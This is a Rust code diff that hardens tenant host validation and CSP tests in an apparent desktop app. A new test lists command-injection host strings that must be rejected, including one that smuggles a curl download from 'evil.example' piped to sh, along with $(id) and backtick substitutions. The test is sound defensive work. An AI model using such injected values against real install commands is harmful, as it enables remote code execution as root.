@@ -419,12 +419,12 @@ fn gtm_container<'a>(
     built_for: Option<&str>,
     container: Option<&'a str>,
 ) -> &'a str {
-    match (shared_host, built_for, container) {
-        (Some(host), Some(built_for), Some(container))
-            if host.trim_end_matches('/') == built_for.trim_end_matches('/') =>
-        {
-            container
-        }
+    let origin = |host: Option<&str>| {
+        host.and_then(|host| url::Url::parse(host).ok())
+            .map(|url| url.origin())
+    };
+    match (origin(shared_host), origin(built_for), container) {
+        (Some(host), Some(built_for), Some(container)) if host == built_for => container,
         _ => "",
     }
 }
@@ -507,8 +507,23 @@ pub(crate) fn on_read_only_mount(_path: &std::path::Path) -> bool {
     false
 }
 
-fn is_loopback_host(host: &str) -> bool {
-    matches!(host, "localhost" | "127.0.0.1" | "[::1]")
+/// The same two names as `withLocalMode` in apps/web and the loopback sources in `devCsp`.
+pub(crate) fn is_loopback_host(host: &str) -> bool {
+    matches!(host, "localhost" | "127.0.0.1")
+}
+
+/// Labels the backend can issue: lowercase (the URL parser has already lowered the
+/// host), digits, `-` and `_`. The parser accepts far more (`'`, `;`, `$`, `(`, `{`),
+/// and the agent's install command is written from this host, where a leading `-`
+/// would read as a flag.
+fn is_tenant_host_name(host: &str) -> bool {
+    host.split('.').all(|label| {
+        !label.is_empty()
+            && !label.starts_with('-')
+            && label
+                .bytes()
+                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-' || b == b'_')
+    })
 }
 
 /// Accept "acme.openframe.ai", "https://acme.openframe.ai", or "…/" and return
@@ -551,6 +566,7 @@ pub(crate) fn tenant_origin(input: &str, shared_host: Option<&str>) -> Result<St
     } else {
         let zone = shared_name.strip_prefix("auth.").unwrap_or(shared_name);
         url.scheme() == "https"
+            && is_tenant_host_name(host)
             && (host == zone
                 || host
                     .strip_suffix(zone)
@@ -1947,6 +1963,31 @@ mod tests {
         }
     }
 
+    /// The agent's install command is written from this host and runs as root.
+    #[test]
+    fn a_tenant_host_is_nothing_but_a_host_name() {
+        for input in [
+            "https://x';{curl,-o,a,evil.example};{sh,a};'.openframe.ai",
+            "https://$(id).openframe.ai",
+            "https://`id`.openframe.ai",
+            "https://a;b.openframe.ai",
+            "https://a&b.openframe.ai",
+            "https://a,b.openframe.ai",
+            "https://-flag.openframe.ai",
+            "https://.openframe.ai",
+            "https://a..openframe.ai",
+        ] {
+            assert!(tenant_origin(input, SHARED).is_err(), "{input}");
+        }
+        for input in [
+            "https://acme-1.openframe.ai",
+            "https://acme_corp.openframe.ai",
+            "https://xn--bcher-kva.openframe.ai",
+        ] {
+            assert!(tenant_origin(input, SHARED).is_ok(), "{input}");
+        }
+    }
+
     #[test]
     fn a_tenant_host_is_a_bare_https_origin() {
         for input in [
@@ -2058,16 +2099,57 @@ mod tests {
                     .any(|source| source == "https:"),
                 "{script_src}"
             );
+            for host in [
+                "https://www.googletagmanager.com",
+                "https://us-assets.i.posthog.com",
+            ] {
+                assert!(script_src.contains(host), "{script_src}");
+            }
         }
         let untouched = security["dangerousDisableAssetCspModification"]
             .as_array()
             .unwrap();
-        assert!(untouched.contains(&serde_json::json!("script-src")));
+        for directive in ["script-src", "style-src"] {
+            assert!(
+                untouched.contains(&serde_json::json!(directive)),
+                "{directive}"
+            );
+        }
+    }
+
+    /// `devCsp` is `csp` plus loopback, so a source added to one alone cannot work in
+    /// dev and be blocked in a release.
+    #[test]
+    fn the_dev_csp_differs_from_the_release_one_only_by_loopback() {
+        let conf: serde_json::Value =
+            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
+        let (csp, dev) = (
+            conf["app"]["security"]["csp"].as_object().unwrap(),
+            conf["app"]["security"]["devCsp"].as_object().unwrap(),
+        );
+        assert_eq!(csp.len(), dev.len());
+        for (directive, sources) in csp {
+            let sources: Vec<&str> = sources.as_str().unwrap().split_whitespace().collect();
+            let dev_sources: Vec<&str> = dev[directive]
+                .as_str()
+                .unwrap()
+                .split_whitespace()
+                .collect();
+            for source in &sources {
+                assert!(dev_sources.contains(source), "{directive}: {source}");
+            }
+            for source in dev_sources.iter().filter(|s| !sources.contains(s)) {
+                assert!(
+                    source.contains("localhost") || source.contains("127.0.0.1"),
+                    "{directive}: {source}"
+                );
+            }
+        }
     }
 
     /// What the page can reach is the capability, not the handler list.
     #[test]
-    fn the_page_is_granted_only_what_it_calls() {
+    fn the_capability_has_no_broad_grant() {
         let capability: serde_json::Value =
             serde_json::from_str(include_str!("../capabilities/main.json")).unwrap();
         let granted: Vec<&str> = capability["permissions"]
@@ -2219,10 +2301,13 @@ mod tests {
     #[test]
     fn an_install_on_the_host_it_was_built_for_gets_the_container() {
         assert_eq!(gtm_container(BUILT_FOR, BUILT_FOR, CONTAINER), "GTM-TEST");
-        assert_eq!(
-            gtm_container(Some("https://openframe.ai/"), BUILT_FOR, CONTAINER),
-            "GTM-TEST"
-        );
+        for spelling in ["https://openframe.ai/", "HTTPS://OpenFrame.AI:443"] {
+            assert_eq!(
+                gtm_container(Some(spelling), BUILT_FOR, CONTAINER),
+                "GTM-TEST",
+                "{spelling}"
+            );
+        }
     }
 
     #[test]
